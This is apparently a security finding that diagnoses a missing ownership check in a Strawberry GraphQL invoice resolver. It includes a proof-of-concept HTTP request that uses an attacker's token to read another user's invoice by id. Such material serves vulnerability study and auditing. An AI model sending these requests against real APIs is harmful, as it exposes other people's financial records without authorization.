diagnosis: The Strawberry GraphQL resolver takes an invoice id and queries the database session from the GraphQL execution context. However, it fails to scope the query to info.context['current_user'].id. Any authenticated GraphQL client can query arbitrary invoice IDs, exposing financial line items, vendor details, and payment histories.
exploit_request:
POST /graphql HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"query": "query { invoice(id: 1042) { id amount customerName items { description cost } } }"}
